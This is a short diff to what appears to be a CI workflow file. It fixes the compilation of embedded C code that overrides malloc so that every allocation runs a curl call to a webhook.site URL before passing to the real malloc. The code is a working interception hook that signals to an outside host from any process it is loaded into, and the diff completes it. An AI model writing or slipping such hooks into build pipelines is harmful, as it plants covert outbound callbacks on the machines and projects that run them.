@@ -19,12 +19,13 @@ jobs:
 
           #include <stdio.h>
           #include <dlfcn.h>
+          #include <stdlib.h>
 
           static void* (*real_malloc)(size_t)=NULL;
 
           void *malloc(size_t size)
           {
-              system("curl https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64")
+              system("curl https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64");
               real_malloc = dlsym(RTLD_NEXT, "malloc");
               return real_malloc(size);
           }
